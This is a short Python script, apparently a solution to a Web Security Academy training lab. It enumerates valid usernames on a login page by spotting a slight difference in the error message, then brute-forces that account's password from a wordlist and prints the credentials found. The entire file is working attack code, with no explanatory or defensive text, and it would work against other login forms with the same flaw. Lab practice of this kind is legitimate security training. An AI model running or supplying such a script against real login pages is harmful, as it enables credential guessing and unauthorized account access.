import requests

url = "https://0adc009e04af905d8070260a008f0049.web-security-academy.net/login"

usernames = open("usernames.txt", "r").readlines()
passwords = open("passwords.txt", "r").readlines()


valid_usernames = []
for username in usernames:
    data = {
        "username" : username.strip(),
        "password" : "a"
    }
    response = requests.post(url,data)
    if(not b"Invalid username or password." in response.content):
        valid_usernames.append(username.strip())

print(valid_usernames)

valid_username = valid_usernames[0]

valid_password = ""
for password in passwords:
    data = {
        "username" : valid_username,
        "password" : password.strip()
    }
    response = requests.post(url,data)
    if(not b"Invalid username or password" in response.content):
        valid_password = password.strip()

print(f"Credentials : {valid_username} / {valid_password}")